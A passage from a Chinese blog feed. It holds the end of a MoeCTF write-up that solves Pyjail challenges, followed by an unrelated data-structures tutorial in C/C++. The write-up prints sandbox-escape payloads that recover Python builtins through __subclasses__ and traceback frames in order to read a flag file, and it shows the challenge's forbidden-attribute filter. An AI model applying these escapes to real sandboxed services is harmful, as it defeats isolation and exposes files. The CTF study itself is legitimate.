</span><span class="token interpolation"><span class="token punctuation">&#123;</span>result<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Execution error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">type</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span>__name__<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></code></pre><p>即使 <code>__builtins__</code>被禁用，仍然可以通过<strong>对象继承链</strong>或<strong>现有类的属性</strong>来重新获取内置函数。例如：</p><ul><li>通过元类（如 <code>().__class__.__mro__</code>）找到基类（如<code>object</code>）。</li><li>遍历子类（如 <code>__subclasses__()</code>）来寻找可用的类（如<code>os._wrap_close</code>、<code>ModuleSpec</code> 等）。</li><li>通过这些类的 <code>__init__.__globals__</code> 或<code>__builtins__</code> 属性重新获取内置函数。</li></ul><pre class="language-none"><code class="language-none">([c for c in ().__class__.__mro__[-1].__subclasses__() if c.__name__&#x3D;&#x3D;&#39;ModuleSpec&#39;][0].__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;tmp&#x2F;flag.txt&#39;).read())</code></pre><pre class="language-none"><code class="language-none">moectf&#123;6486e9b8-47b8-0b5e-dead-8e554dd2a1b6&#125;</code></pre><h2 id="pyjail4">Pyjail4</h2><blockquote><p>flag 位置在 /tmp 下</p></blockquote><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> ast<span class="token keyword">import</span> base64<span class="token comment"># 自定义 AST 节点访问器来限制可用的语法结构</span><span class="token keyword">class</span> <span class="token class-name">RestrictedNodeVisitor</span><span class="token punctuation">(</span>ast<span class="token punctuation">.</span>NodeVisitor<span class="token punctuation">)</span><span class="token punctuation">:</span>    forbidden_attrs <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"__class__"</span><span class="token punctuation">,</span> <span class="token string">"__dict__"</span><span class="token punctuation">,</span> <span class="token string">"__bases__"</span><span class="token punctuation">,</span> <span class="token string">"__mro__"</span><span class="token punctuation">,</span> <span class="token string">"__subclasses__"</span><span class="token punctuation">,</span>        <span class="token string">"__globals__"</span><span class="token punctuation">,</span> <span class="token string">"__code__"</span><span class="token punctuation">,</span> <span class="token string">"__closure__"</span><span class="token punctuation">,</span> <span class="token string">"__func__"</span><span class="token punctuation">,</span> <span class="token string">"__self__"</span><span class="token punctuation">,</span>        <span class="token string">"__module__"</span><span class="token punctuation">,</span> <span class="token string">"__import__"</span><span class="token punctuation">,</span> <span class="token string">"__builtins__"</span><span class="token punctuation">,</span> <span class="token string">"__base__"</span><span class="token punctuation">,</span> <span class="token string">"__init__"</span><span class="token punctuation">,</span> <span class="token string">"__getattribute__"</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">def</span> <span class="token function">visit_Attribute</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 禁止危险属性访问</span>        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>attr<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token keyword">and</span> node<span class="token punctuation">.</span>attr <span class="token keyword">in</span> self<span class="token punctuation">.</span>forbidden_attrs<span class="token punctuation">:</span>            <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Access to attribute '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>node<span class="token punctuation">.</span>attr<span class="token punctuation">&#125;</span></span><span class="token string">' is forbidden!"</span></span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>generic_visit<span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">chall</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user_input <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Give me your code after base64 encoding it: "</span><span class="token punctuation">)</span>    code <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>user_input<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> user_input<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Empty input!"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># 使用 AST 解析和验证代码</span>        tree <span class="token operator">=</span> ast<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>code<span class="token punctuation">)</span>        visitor <span class="token operator">=</span> RestrictedNodeVisitor<span class="token punctuation">(</span><span class="token punctuation">)</span>        visitor<span class="token punctuation">.</span>visit<span class="token punctuation">(</span>tree<span class="token punctuation">)</span>                <span class="token comment"># 创建受限的执行环境</span>        safe_builtins <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"print"</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">,</span>            <span class="token string">"filter"</span><span class="token punctuation">:</span> <span class="token builtin">filter</span><span class="token punctuation">,</span>            <span class="token string">"list"</span><span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">,</span>            <span class="token string">"len"</span><span class="token punctuation">:</span> <span class="token builtin">len</span><span class="token punctuation">,</span>            <span class="token string">"Exception"</span><span class="token punctuation">:</span> Exception        <span class="token punctuation">&#125;</span>        safe_globals <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"__builtins__"</span><span class="token punctuation">:</span> safe_builtins<span class="token punctuation">&#125;</span>                <span class="token comment"># 执行用户代码</span>        <span class="token keyword">exec</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> safe_globals<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Code executed successfully!"</span><span class="token punctuation">)</span>                <span class="token keyword">except</span> SyntaxError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Syntax Error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">except</span> RuntimeError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Runtime Error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Execution Error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">type</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">.</span>__name__<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></code></pre><p><strong>在Python中，栈帧（StackFrame）是解释器用于管理函数调用的一种内部数据结构。每当一个函数被调用时，Python就会创建一个栈帧对象，其中包含了该函数执行所需的“上下文”，例如局部变量、传入的参数以及当前指令的位置（返回地址）。</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64code <span class="token operator">=</span> <span class="token triple-quoted-string string">"""try:    raise Exception()except Exception as e:    frame = e.__traceback__.tb_frame.f_back    builtins = frame.f_globals['__builtins__']    print(builtins.open('/tmp/flag.txt').read())"""</span>encoded <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>code<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>encoded<span class="token punctuation">)</span>dHJ5OgogICAgcmFpc2UgRXhjZXB0aW9uKCkKZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgZnJhbWUgPSBlLl9fdHJhY2ViYWNrX18udGJfZnJhbWUuZl9iYWNrCiAgICBidWlsdGlucyA9IGZyYW1lLmZfZ2xvYmFsc1snX19idWlsdGluc19fJ10KICAgIHByaW50KGJ1aWx0aW5zLm9wZW4oJy90bXAvZmxhZy50eHQnKS5yZWFkKCkp</code></pre><pre class="language-none"><code class="language-none">moectf&#123;8e6909e8-7b9b-1c08-3131-46859e6830d9&#125;</code></pre><h2 id="moectf指导版">MoeCTF指导版</h2><blockquote><p>最近锤子太多了，都忙不过来了！！为了帮助大家更好地可以完成题目，fifker找到了一个好帮手…它可能有点…（？</p><p>耄耋：拿到flag的方法都告诉你了，你二朵隆吗？？（哈</p><p>（这只是一个游戏，没有任何web知识点考察，也不需要任何web手段，千万不要使用，否则会影响游戏体验）</p><p>（游戏加载需要一定时间）</p></blockquote><p>查看源代码有助于做题。</p><p><strong>第一关</strong>：精准投喂<code>25</code>个小鱼干，不然会触发<code>114514</code></p><p><strong>第二关</strong>：找信息即可<code>241410173</code>和<code>241410156</code></p><p><strong>第三关</strong>：文字游戏，密码分别是<code>password</code>和<code>incorrect!</code></p><p><strong>第四关</strong>：复制发现隐藏的密钥<code>xbhiuebkjvs</code></p><p><strong>第五关</strong>：翻转后点击<code>flag</code>按钮凸了</p><pre class="language-none"><code class="language-none">moectf&#123;11738832-155d-3f7a-cc6b-95da7459659d&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构（C语言版）</title>
      <link href="/2025/09/26/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%88C%E8%AF%AD%E8%A8%80%E7%89%88%EF%BC%89/"/>
      <url>/2025/09/26/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%88C%E8%AF%AD%E8%A8%80%E7%89%88%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="data-structure">Data Structure</h1><h2 id="线性表">线性表</h2><h3 id="顺序表">顺序表</h3><pre class="language-c++" data-language="c++"><code class="language-c++">#define MAXSIZE 100typedef int ElemType;typedef struct &#123;    ElemType *elem;    int length;&#125; Sqlist;&#x2F;&#x2F;初始化void InitList(Sqlist &amp;L) &#123;    L.elem &#x3D; new ElemType[MAXSIZE];    if (!L.elem) return;    L.length &#x3D; 0;&#125;&#x2F;&#x2F;取值void GetElem(Sqlist L, int i, ElemType &amp;e) &#123;    if (i &lt; 1 || i &gt; L.length) return;    e &#x3D; L.elem[i - 1];&#125;&#x2F;&#x2F;定位int LocateElem(Sqlist L, ElemType e) &#123;    for (int i &#x3D; 0; i &lt; L.length; i++) &#123;        if (L.elem[i] &#x3D;&#x3D; e) return i + 1;    &#125;    return 0;&#125;&#x2F;&#x2F;插入void InsertElem(Sqlist &amp;L, int i, ElemType e) &#123;    if (i &lt; 1 || i &gt; L.length + 1) return;    if (L.length &#x3D;&#x3D; MAXSIZE) return;    for (int j &#x3D; L.length - 1; j &gt;&#x3D; i - 1; j--) &#123;        L.elem[j + 1] &#x3D; L.elem[j];    &#125;    L.elem[i - 1] &#x3D; e;    L.length++;&#125;&#x2F;&#x2F;删除void DeleteElem(Sqlist &amp;L, int i) &#123;    if (i &lt; 1 || i &gt; L.length) return;    for (int j &#x3D; i; j &lt; L.length; j++) &#123;        L.elem[j - 1] &#x3D; L.elem[j];    &#125;    L.length--;&#125;</code></pre><h3 id="单链表">单链表</h3><pre class="language-c++" data-language="c++"><code class="language-c++">#include&lt;iostream&gt;using namespace std;typedef int ElemType;typedef struct Node &#123;    ElemType data;    struct Node* next;&#125;Node,*LinkList;&#x2F;&#x2F; 初始化(带头结点)void InitList(LinkList &amp;L) &#123;    L &#x3D; (Node*)malloc(sizeof(Node));    L-&gt;next &#x3D; NULL;    &#x2F;&#x2F;若不带头结点，直接L &#x3D; NULL;&#125;&#x2F;&#x2F; 求表长int Length(LinkList L)&#123;    int len &#x3D; 0;    Node *p &#x3D; L;    while(p-&gt;next!&#x3D;NULL)&#123;        p &#x3D; p-&gt;next;        len++;    &#125;    return len;&#125;&#x2F;&#x2F; 取值void GetElem(LinkList L, int i, ElemType &amp;e) &#123;    Node* p &#x3D; L;    int j &#x3D; 0;    while (p &amp;&amp; j &lt; i) &#123;        p &#x3D; p-&gt;next;        j++;    &#125;    if (!p || j &gt; i) return;    e &#x3D; p-&gt;data;&#125;&#x2F;&#x2F; 查找Node* LocateNode(LinkList L, ElemType e) &#123;    Node* p &#x3D; L-&gt;next;    while (p &amp;&amp; p-&gt;data !&#x3D; e) &#123;        p &#x3D; p-&gt;next;    &#125;    return p;&#125;&#x2F;&#x2F;插入void insertNode(LinkList &amp;L, int i, ElemType e) &#123;    Node* p &#x3D; L;    int j &#x3D; 0;    while (p &amp;&amp; j &lt; i - 1) &#123;        p &#x3D; p-&gt;next;        j++;    &#125;    if (!p) return;    Node* s &#x3D; new Node;    s-&gt;data &#x3D; e;    s-&gt;next &#x3D; p-&gt;next;    p-&gt;next &#x3D; s;&#125;&#x2F;&#x2F;删除void deleteNode(LinkList &amp;L, int i) &#123;    Node* p &#x3D; L;    int j &#x3D; 0;    while (p &amp;&amp; j &lt; i - 1) &#123;        p &#x3D; p-&gt;next;        j++;    &#125;    if (!p-&gt;next||!p) return;    Node* q &#x3D; p-&gt;next;    p-&gt;next &#x3D; q-&gt;next;    delete q;&#125;&#x2F;&#x2F;头插法void createList_H(LinkList &amp;L, int n) &#123;    L &#x3D; new Node; &#x2F;&#x2F; L固定为头结点    L-&gt;next &#x3D; NULL;    for (int i &#x3D; 0; i &lt; n; i++) &#123;        Node* p &#x3D; new Node;        cin &gt;&gt; p-&gt;data;        p-&gt;next &#x3D; L-&gt;next;        L-&gt;next &#x3D; p;    &#125;&#125;&#x2F;&#x2F;尾插法void createList_R(Node* &amp;L, int n) &#123;    L &#x3D; new Node; &#x2F;&#x2F;L为固定头结点    L-&gt;next &#x3D; NULL;    Node* r &#x3D; L;    for (int i &#x3D; 0; i &lt; n; i++) &#123;        Node* p &#x3D; new Node;        cin &gt;&gt; p-&gt;data;        p-&gt;next &#x3D; NULL;        r-&gt;next &#x3D; p;        r &#x3D; p;    &#125;    &#x2F;&#x2F;循环列表，p-&gt;next &#x3D; L-&gt;next;&#125;&#x2F;&#x2F;遍历void printlist(LinkList L)&#123;     Node *p &#x3D; L;     while (p) &#123;           printf(&quot;%d &quot;, p-&gt;data);           p &#x3D; p-&gt;next;     &#125;     printf(&quot;\n&quot;);&#125;</code></pre><h3 id="双链表">双链表</h3><pre class="language-c++" data-language="c++"><code class="language-c++">#include&lt;iostream&gt;using namespace std;typedef int Elemtype;&#x2F;&#x2F; 定义双链表节点typedef struct DNode &#123;    Elemtype data;    struct DNode* prior;    struct DNode* next;&#125; DNode, *DList;&#x2F;&#x2F; 初始化双链表DList initList() &#123;    DNode* head &#x3D; new DNode();    head-&gt;prior &#x3D; nullptr;    head-&gt;next &#x3D; nullptr;    return head;&#125;&#x2F;&#x2F; 创建双链表void createList(DList &amp;L, int n) &#123;    DNode* p &#x3D; L;    for (int i &#x3D; 0; i &lt; n; i++) &#123;        DNode* newNode &#x3D; new DNode;        cin &gt;&gt; newNode-&gt;data;        newNode-&gt;prior &#x3D; p;        newNode-&gt;next &#x3D; nullptr;        p-&gt;next &#x3D; newNode;        p &#x3D; newNode;    &#125;    &#x2F;&#x2F;循环链表，newNode-&gt;next &#x3D; L-&gt;next;L-&gt;next-&gt;prior &#x3D; newNode;&#125;&#x2F;&#x2F; 插入操作void insertNode(DList &amp;L, int pos, Elemtype e) &#123;    DNode* p &#x3D; L;    int i &#x3D; 0;    while (p &amp;&amp; i &lt; pos) &#123;        p &#x3D; p-&gt;next;        i++;    &#125;    if (!p) &#123;        return;    &#125;    DNode* newNode &#x3D; new DNode;    newNode-&gt;data &#x3D; e;    newNode-&gt;next &#x3D; p-&gt;next;    newNode-&gt;prior &#x3D; p;    if (p-&gt;next) &#123;        p-&gt;next-&gt;prior &#x3D; newNode;    &#125;    p-&gt;next &#x3D; newNode;&#125;&#x2F;&#x2F; 删除操作void deleteNode(DList &amp;L, int pos) &#123;    DNode* p &#x3D; L-&gt;next;    int i &#x3D; 0;    while (p &amp;&amp; i &lt; pos) &#123;        p &#x3D; p-&gt;next;        i++;    &#125;    if (!p) &#123;        return;    &#125;    if (p-&gt;prior) &#123;        p-&gt;prior-&gt;next &#x3D; p-&gt;next;    &#125;    if (p-&gt;next) &#123;        p-&gt;next-&gt;prior &#x3D; p-&gt;prior;    &#125;    delete p;&#125;&#x2F;&#x2F; 正向遍历void traverseForward(DList L) &#123;    DNode* p &#x3D; L-&gt;next;    while (p) &#123;        cout &lt;&lt; p-&gt;data &lt;&lt; &quot; &quot;;        p &#x3D; p-&gt;next;    &#125;    cout &lt;&lt; endl;&#125;&#x2F;&#x2F; 反向遍历void traverseBackward(DList L) &#123;    DNode* p &#x3D; L;    while (p-&gt;next) &#123;        p &#x3D; p-&gt;next;    &#125;    while (p !&#x3D; L) &#123;        cout &lt;&lt; p-&gt;data &lt;&lt; &quot; &quot;;        p &#x3D; p-&gt;prior;    &#125;    cout &lt;&lt; endl;&#125;</code></pre><h4 id="stl">STL</h4><p><strong>list</strong></p><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;list&gt;#include&lt;iostream&gt;using namespace std;int main()&#123;    list&lt;int&gt; l;    &#x2F;&#x2F; 插入元素    l.push_back(10);    l.push_front(5);    &#x2F;&#x2F; 输出    for (int val : l) &#123;        cout &lt;&lt; val &lt;&lt; &quot; &quot;;    &#125;    &#x2F;&#x2F; 查找元素    auto it &#x3D; find(l.begin(), l.end(), 10);    if (it !&#x3D; l.end()) &#123;        cout &lt;&lt; distance(l.begin(),it) &lt;&lt; endl;    &#125;    &#x2F;&#x2F; 删除元素    l.erase(l.begin());    &#x2F;&#x2F; 反转链表    l.reverse();    &#x2F;&#x2F; 排序链表    l.sort();    &#x2F;&#x2F; 删除相邻的重复元素    l.push_back(20);    l.push_back(20);    l.unique();&#125;</code></pre><h3 id="静态链表">静态链表</h3><pre class="language-c++" data-language="c++"><code class="language-c++">typedef int ElemType;#define MAXSIZE 50typedef struct&#123;    ElemType data;    int next;&#x2F;&#x2F; 存储地址(具体数值)&#125;SLinkList[MAXSIZE];</code></pre><h2 id="栈与队列">栈与队列</h2><h3 id="栈">栈</h3><pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;using namespace std;#define MAXSIZE 100typedef int Elemtype;&#x2F;&#x2F;顺序存储typedef struct&#123;    Elemtype *top;    Elemtype *base;    int size;&#125; SqStack;void Init(SqStack &amp;s)&#123;    s.base &#x3D; new Elemtype[MAXSIZE];    s.top &#x3D; s.base;    s.size &#x3D; MAXSIZE;&#125;bool IsEmpty(SqStack s)&#123;    return s.base &#x3D;&#x3D; s.top;&#125;bool IsFull(SqStack s)&#123;    return (s.top - s.base) &#x3D;&#x3D; s.size;&#125;void Push(SqStack &amp;s, Elemtype e)&#123;    if (IsFull(s))    &#123;        return;    &#125;    *s.top &#x3D; e;    s.top++;&#125;Elemtype Pop(SqStack &amp;s, Elemtype &amp;e)&#123;    if (IsEmpty(s))    &#123;        return;    &#125;    s.top--;    e &#x3D; *s.top;&#125;void Print(SqStack &amp;s)&#123;    if (IsEmpty(s))    &#123;        return;    &#125;    for (Elemtype *p &#x3D; s.base; p !&#x3D; s.top; p++)    &#123;        cout &lt;&lt; *p &lt;&lt; &quot; &quot;;    &#125;    cout &lt;&lt; endl;&#125;Elemtype GetTop(SqStack s)&#123;    if (IsEmpty(s))    &#123;        return;    &#125;    Elemtype e &#x3D; *s.top;    return e;&#125;&#x2F;&#x2F; 链式存储typedef struct Linknode&#123;    Elemtype data;    struct Linknode *next;&#125; Linknode, *LiStack;void Init(LiStack &amp;s)&#123;    s &#x3D; NULL;&#125;void Push(LiStack &amp;s, Elemtype e)&#123;    LiStack p &#x3D; new Linknode;    p-&gt;data &#x3D; e;    p-&gt;next &#x3D; s;    s &#x3D; p;&#125;void Pop(LiStack &amp;s, Elemtype &amp;e)&#123;    if (s &#x3D;&#x3D; NULL)        return;    e &#x3D; s-&gt;data;    LiStack p &#x3D; s;    s &#x3D; s-&gt;next;    delete p;&#125;Elemtype GetTop(LiStack s)&#123;    if (s !&#x3D; NULL)        return s-&gt;data;    return -1;&#125;&#x2F;&#x2F; 共享存储typedef struct&#123;    Elemtype *base;    Elemtype *top1;    Elemtype *top2;    int capacity;&#125; SharedStack;</code></pre><h4 id="stl-1">STL</h4><p><strong>stack</strong></p><ul><li><code>top()</code> 访问栈顶元素（如果栈为空，此处会出错）</li><li><code>push(x)</code> 向栈中插入元素 x</li><li><code>pop()</code> 删除栈顶元素</li><li><code>size()</code> 查询容器中的元素数量</li><li><code>empty()</code> 询问容器是否为空</li></ul><pre class="language-c++" data-language="c++"><code class="language-c++">#include&lt;stack&gt;using namespace std;int main()&#123;stack&lt;int&gt; s1;s1.push(2);s1.push(1);cout &lt;&lt; s1.size() &lt;&lt; endl;s1.pop();s1.pop();cout &lt;&lt; s1.empty() &lt;&lt; endl;&#125;</code></pre><h3 id="队列">队列</h3><pre class="language-c++" data-language="c++"><code class="language-c++">#include&lt;iostream&gt;using namespace std;#define maxsize 100typedef int ElemType;typedef struct &#123;    ElemType *base;    int front;    int rear;&#125; SqQueue;&#x2F;&#x2F; 可作为单向队列或循环队列，这里视为循环队列&#x2F;&#x2F; 初始化void InitQueue(SqQueue &amp;q) &#123;    q.base &#x3D; new ElemType[maxsize];    if (!q.base) &#123;        return;    &#125;    q.front &#x3D; 0;    q.rear &#x3D; 0;&#125;&#x2F;&#x2F; 长度int QueueLength(SqQueue q) &#123;    return (q.rear - q.front + maxsize) % maxsize;&#125;&#x2F;&#x2F; 判断是否为空bool IsEmpty(SqQueue q) &#123;    return q.front &#x3D;&#x3D; q.rear;&#125;&#x2F;&#x2F; 判断是否已满bool IsFull(SqQueue q) &#123;    return (q.rear + 1) % maxsize &#x3D;&#x3D; q.front;&#125;&#x2F;&#x2F; 入队void EnQueue(SqQueue &amp;q, ElemType e) &#123;    if (IsFull(q)) &#123;        return;    &#125;    q.base[q.rear] &#x3D; e;    q.rear &#x3D; (q.rear + 1) % maxsize;&#125;&#x2F;&#x2F; 出队void DeQueue(SqQueue &amp;q, ElemType &amp;e) &#123;    if (IsEmpty(q)) &#123;        return;    &#125;    e &#x3D; q.base[q.front];    q.front &#x3D; (q.front + 1) % maxsize;&#125;&#x2F;&#x2F; 获取队头元素ElemType GetHead(SqQueue q) &#123;    if (!IsEmpty(q)) &#123;        return q.base[q.front];    &#125;    return -1;&#125;&#x2F;&#x2F; 打印void PrintQueue(SqQueue q) &#123;    if (IsEmpty(q)) &#123;        return;    &#125;    int i &#x3D; q.front;    while (i !&#x3D; q.rear) &#123;        cout &lt;&lt; q.base[i] &lt;&lt; &quot; &quot;;        i &#x3D; (i + 1) % maxsize;    &#125;    cout &lt;&lt; endl;&#125;&#x2F;&#x2F; 队列链式存储(带头结点)&#x2F;&#x2F; 节点定义typedef struct QNode&#123;    ElemType data;    struct QNode *next;&#125;QNode;&#x2F;&#x2F; 链队列定义typedef struct &#123;    QNode *front;    QNode *rear;&#125;LinkQueue;&#x2F;&#x2F; 初始化队列void InitQueue(LinkQueue &amp;Q) &#123;    Q.front &#x3D; new QNode;    Q.rear &#x3D; Q.front;    Q.front-&gt;next &#x3D; NULL;&#125;&#x2F;&#x2F; 判断为空bool IsEmpty(LinkQueue Q)&#123;    return (Q.front &#x3D;&#x3D; Q.rear);&#125;&#x2F;&#x2F; 入队操作void EnQueue(LinkQueue &amp;Q, ElemType e) &#123;    QNode *newNode &#x3D; new QNode;    newNode-&gt;data &#x3D; e;    newNode-&gt;next &#x3D; NULL;    Q.rear-&gt;next &#x3D; newNode;    Q.rear &#x3D; newNode;&#125;&#x2F;&#x2F; 出队操作void DeQueue(LinkQueue &amp;Q, ElemType &amp;e) &#123;    if (IsEmpty(Q)) &#123;        return;    &#125;    QNode *temp &#x3D; Q.front-&gt;next;    e &#x3D; temp-&gt;data;    Q.front-&gt;next &#x3D; temp-&gt;next;    if (temp &#x3D;&#x3D; Q.rear) &#123;        Q.rear &#x3D; Q.front;    &#125;    delete temp;&#125;&#x2F;&#x2F; 获取队头元素ElemType GetFront(LinkQueue Q) &#123;    if (IsEmpty(Q)) &#123;        return -1;    &#125;    return Q.front-&gt;next-&gt;data;&#125;</code></pre><h4 id="stl-2">STL</h4><p><strong>queue</strong></p><ul><li><code>front()</code> 访问队首元素（如果队列为空，此处会出错）</li><li><code>push(x)</code> 向队列中插入元素 x</li><li><code>pop()</code> 删除队首元素</li><li><code>size()</code> 查询容器中的元素数量</li><li><code>empty()</code> 询问容器是否为空</li></ul><p><strong>deque</strong></p><ul><li><code>push_front(x)</code> 在队首插入元素 x</li><li><code>push_back(x)</code> 在队尾插入元素 x</li><li><code>pop_front()</code> 删除队首元素</li><li><code>pop_back()</code> 删除队尾元素</li><li><code>front()</code> 访问队首元素</li><li><code>back()</code> 访问队尾元素</li><li><code>size()</code> 查询元素数量</li><li><code>empty()</code> 判断是否为空</li></ul><pre class="language-c++" data-language="c++"><code class="language-c++">#include&lt;queue&gt;#include&lt;iostream&gt;using namespace std;int main()&#123;&#x2F;&#x2F; 单向队列queue&lt;int&gt; q1;q1.push(2);q1.push(1);q1.pop();cout &lt;&lt; q1.size() &lt;&lt; endl;cout &lt;&lt; q1.front() &lt;&lt; endl;q1.pop();cout &lt;&lt; q1.empty() &lt;&lt; endl;&#x2F;&#x2F; 双向队列deque&lt;int&gt; dq;dq.push_back(3);dq.push_front(1);dq.pop_front();dq.push_front(5);dq.pop_back();dq.pop_back();cout &lt;&lt; dq.size() &lt;&lt; endl;cout &lt;&lt; dq.empty() &lt;&lt; endl;&#125;</code></pre><h4 id="优先队列priority_queue">优先队列(priority_queue)</h4><pre class="language-c++" data-language="c++"><code class="language-c++">&#x2F;&#x2F; 默认最小堆(原理其实是构建完全二叉树进行堆排序，因此初始化时有数组和比较条件)priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt; pq&#x2F;&#x2F; 自定义堆struct cmp &#123;    bool operator()(int a, int b) &#123;        return a &lt; b; &#x2F;&#x2F; 最大堆    &#125;&#125;;priority_queue&lt;int, vector&lt;int&gt;, cmp&gt; pq;&#x2F;&#x2F; 插入元素int element &#x3D; 1;pq.push(element);&#x2F;&#x2F; 访问顶部元素int top &#x3D; pq.top();&#x2F;&#x2F; 删除顶部元素pq.pop();&#x2F;&#x2F; 检查是否为空bool isEmpty &#x3D; pq.empty();&#x2F;&#x2F; 获取元素数量size_t size &#x3D; pq.size();</code></pre><h3 id="数组">数组</h3><p>以二维数组为例：</p><p><span class="math display"><em>L</em><em>O</em><em>C</em>(<em>i</em>, <em>j</em>) = <em>L</em><em>O</em><em>C</em>(0, 0) + (<em>n</em> * <em>i</em> + <em>j</em>) * <em>L</em></span></p><p>其中<span class="math inline"><em>L</em></span>为每个数组元素所占的单元。</p><p><strong>特殊矩阵的压缩存储</strong></p><p>1.对称矩阵</p><p>对于 n 阶矩阵 A，若<span class="math inline"><em>a</em><sub><em>i</em>, <em>j</em></sub> = <em>a</em><sub><em>j</em>, <em>i</em></sub></span>，则为对称矩阵。假设我们要压缩成一维数组，求解下标<span class="math inline"><em>k</em></span>有以下公式：</p><p><span class="math display">$$i&gt;=j,k = \frac{i(i-1)}{2}+j-1\\i&lt;j,k = \frac{j(j-1)}{2}+i-1\\$$</span></p><p>2.三角矩阵</p><p><span class="math display">$$上三角：i&gt;j,k =\frac{n(n+1)}{2},i&lt;=j,\frac{(2n-i+2)(i-1)}{2}+j-i\\下三角：i&gt;j,k = \frac{i(i-1)}{2}+j-1,i&lt;=j,\frac{n(n+1)}{2}$$</span></p><p>3.带状矩阵</p><p>第 1 行和第 n行有两个元，其余行均有三个元，（形成三条对角线），对<span class="math inline"><em>a</em><sub><em>i</em>, <em>j</em></sub></span>若压缩成一维矩阵有：</p><p><span class="math display"><em>k</em> = 2<em>i</em> + <em>j</em> − 3</span></p><p>4.稀疏矩阵</p><p>将稀疏分布的矩阵转为三元组（行标<span class="math inline"><em>i</em></span>，列标<span class="math inline"><em>j</em></span>，值<span class="math inline"><em>a</em><sub><em>i</em>, <em>j</em></sub></span>）</p><pre class="language-c++" data-language="c++"><code class="language-c++">typedef struct&#123;    int col;    int row;    int data;&#125;Matrix;</code></pre><h4 id="stl-3">STL</h4><p><strong>vector</strong></p><ul><li><p><code>push_back(x)</code> 在尾部插入元素 x</p></li><li><p><code>pop_back()</code> 删除尾部元素</p></li><li><p><code>front()</code> 访问首元素</p></li><li><p><code>back()</code> 访问尾元素</p></li><li><p><code>size()</code> 